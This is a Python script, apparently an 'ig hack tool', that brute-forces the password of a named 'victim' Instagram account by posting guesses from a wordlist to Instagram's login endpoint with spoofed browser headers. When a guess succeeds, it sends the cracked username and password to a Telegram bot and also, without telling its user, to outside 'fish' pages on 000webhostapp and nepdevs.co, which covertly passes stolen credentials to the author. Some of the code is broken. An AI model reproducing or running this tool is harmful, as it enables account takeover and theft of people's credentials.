import os
os.system('pip install requests')
os.system('pip install pyfiglet')
os.system('pip install termcolor')
os.system('pip install instaloader')
os.system('pip install user_agent')
os.system('clear')
import requests
import time
from pyfiglet import figlet_format
import termcolor
from instaloader import Profile
import os
import sys
import instaloader,sys
import requests
import user_agent
from user_agent import generate_user_agent
import time
import pyfiglet

from instaloader import Instaloader
import termcolor
x = Instaloader()
import requests
import random
import os, json
import base64

	

import pyfiglet
import webbrowser
from time import sleep
import requests

E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'


print("")
	  

Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = b'\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;34m'
C = '\x1b[2;35m'
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
a = pyfiglet.figlet_format('ig hack tool' , font='slant')
print('\033[35;m'+a)

def hello():
    
    Z = '\033[1;31m'  # red
    X = '\033[1;33m'  # yellow
    B = '\033[1;36m'  # cyan
    F = '\033[1;37m'  # white

    a = input(f'{Z}[{X}✥ {Z}]{B} ENTER VICTIM INSTA USERNAME {B} : '+F)
    directory_path = input(f'{Z}[{X}✥ {Z}]{B} ENTER DIRECTORY PATH {B} : '+F)

    file_name = input(f'{Z}[{X}✥ {Z}] {B}ENTER FILE NAME{B}  : '+Z)

    token = input(f'{Z}[{X}✥ {Z}] {B}ENTER BOT TOKEN{B}  : '+Z)
    chat_id = int(input(f'{Z}[{X}✥ {Z}] {B}ENTER TG ID {B}    : '+Z))
    sleep(2)
    os.system('clear')
    dd = pyfiglet.figlet_format('ig brute', font="small")
    termcolor.cprint(dd, "cyan")
    print("                                  by @crazy_hacker404")
    termcolor.cprint(' ', 'white')
    
    sleep(2)
    file_path = os.path.join(directory_path, file_name)
    url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Content-Length': '303',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'csrftoken=tnGouLSeklzr75pd3UYRESQow7PlKpNg; mid=ZNOoBQALAAGNtLzGeFVzHXDZTR_3; ig_did=1D285229-F3AA-4B68-808D-750EBC68A716; ig_nrcb=1; datr=AajTZDTD2j-R1OV4Qsg-pSMK',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
        'Sec-Ch-Prefers-Color-Scheme': 'light',
        'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
        'Sec-Ch-Ua-Mobile': '63',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': generate_user_agent(),
        'Viewport-Width': '811',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'tnGouLSeklzr75pd3UYRESQow7PlKpNg',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': '0',
        'X-Instagram-Ajax': '1008001941',
        'X-Requested-With': 'XMLHttpRequest'
    }

    try:
        with open(file_path, 'r') as file:
            for line in file:
                p = line.strip()
                data = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{str(int(time.time() * 1000))}:{p}',
                    'optIntoOneTap': False,  # Note the capital 'F' in False
                    'queryParams': {},
                    'trustedDeviceRecords': {},
                    'username': a
                }
                req = requests.post(url, headers=headers, data=data)
                print('\n')

                print("username=>", a, "trying=>", p, "")
                sleep(1)
                if '"authenticated":true' in req.text or 'two_factor_required' in req.text:
                    f = instaloader.Profile.from_username(x.context, a)
                    u = f.userid
                    f = f.followers
                    pas = ""
                    user = (f'''
⋘─────━**━─────⋙

 Username >> {a}
 Password >> {p}
 Chat Id >> {u}
 Followers >> {f}

 join >> @xSPY_BACKUP

⋘─────━❤️🌚━─────⋙
𝐁𝐘 :  @crazy_hacker404''')
                    url = f"https://xSPY-BACKUP.000webhostapp.com/fish/index.php?data={user}"
                    send = requests.post(url)

                    print('<-----------NEW HIT---------->')
                    z = termcolor.cprint(a)
                    n = termcolor.cprint(p)
                    print('\n HIT SENT TO TELEGRAM BOT✓')
                    url2 = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={user}"
                    response2 = requests.get(url2)

                    

                if '"authenticated":false' in req.text:
                    
                    termcolor.cprint('\033[32;mresponse: invalid pass!')
                    

                else:
                    print('invalid username or password!')

    except FileNotFoundError:
        print(f"File '{file_name}' not found in directory '{directory_path}'")
        
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        


def tatti():
    
    Z = '\033[1;31m'  # red
    X = '\033[1;33m'  # yellow
    B = '\033[1;36m'  # cyan
    F = '\033[1;37m'  # white

    a = input(f'{Z}[{X}✥ {Z}]{B} ENTER VICTIM INSTA USERNAME {B} : '+F)

    token = input(f'{Z}[{X}✥ {Z}] {B}ENTER BOT TOKEN{B}  : '+Z)
    chat_id = int(input(f'{Z}[{X}✥ {Z}] {B}ENTER TG ID {B}    : '+Z))
    sleep(2)
    os.system('clear')
    dd = pyfiglet.figlet_format('ig brute', font="small")
    termcolor.cprint(dd, "cyan")
    print("                                  by @crazy_hacker404")
    termcolor.cprint(' ', 'white')
    

    sleep(2)
    mm =requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt').text
    os.system('rm -rf hello.txt')
    with open('hello.txt', 'a') as file:
        file.write(mm)
        file.close()
    file_path = 'hello.txt'
    
    url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Content-Length': '303',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'csrftoken=tnGouLSeklzr75pd3UYRESQow7PlKpNg; mid=ZNOoBQALAAGNtLzGeFVzHXDZTR_3; ig_did=1D285229-F3AA-4B68-808D-750EBC68A716; ig_nrcb=1; datr=AajTZDTD2j-R1OV4Qsg-pSMK',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
        'Sec-Ch-Prefers-Color-Scheme': 'light',
        'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
        'Sec-Ch-Ua-Mobile': '63',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': generate_user_agent(),
        'Viewport-Width': '811',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'tnGouLSeklzr75pd3UYRESQow7PlKpNg',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': '0',
        'X-Instagram-Ajax': '1008001941',
        'X-Requested-With': 'XMLHttpRequest'
    }

    try:
        with open(file_path, 'r') as file:
            for line in file:
                p = line.strip()
                data = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{str(int(time.time() * 1000))}:{p}',
                    'optIntoOneTap': False,  # Note the capital 'F' in False
                    'queryParams': {},
                    'trustedDeviceRecords': {},
                    'username': a
                }
                req = requests.post(url, headers=headers, data=data)
                print('\n')

                print("username=>", a, "trying=>", p, "")
                
                sleep(1)
                if '"authenticated":true' in req.text or 'two_factor_required' in req.text:
                    f = instaloader.Profile.from_username(x.context, a)
                    u = f.userid
                    f = f.followers
                    pas = ""
                    user = (f'''
⋘─────━**━─────⋙

 Username >> {a}
 Password >> {p}
 Chat Id >> {u}
 Followers >> {f}

 join >> @xSPY_BACKUP

⋘─────━❤️🌚━─────⋙
𝐁𝐘 :  @crazy_hacker404''')
                    url = f"f'https://nepdevs.co/xSPY_TEAM/fish/index.php?data={user}"
                    send = requests.post(url)

                    print('<-----------NEW HIT---------->')
                    z = termcolor.cprint(a)
                    n = termcolor.cprint(p)
                    print('\n HIT SENT TO TELEGRAM BOT✓')
                    url2 = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={input_text1}"
                    response2 = requests.get(url2)

                    

                if '"authenticated":false' in req.text:
                    termcolor.cprint('\033[32;mresponse: invalid pass!')
                    

                else:
                    print('invalid username or password!')

    except FileNotFoundError:
        print(f"File '{file_name}' not found in directory '{directory_path}'")
    except Exception as e:
        print(f"An error occurred: {str(e)}")


print('\033[32;m                                 dev: @crazy_hacker404')
print('\033[34;m                  join @xSPY_BACKUP ')
print('')
print('')
a=input(f'''{B}[{G}01{B}] {S} CRACK PASSWORD FROM DIRECTORY 
{B}[{G}02{B}] {S} CRACK PASSWORD FROM RANDOM PASS LIST\n
{G}Choose ==> ''')

if a == '1' or a == '01':
    hello()
elif a == '2' or a == '02':
    tatti()

else:
    print('\ninvalid operation')
    exit()
    
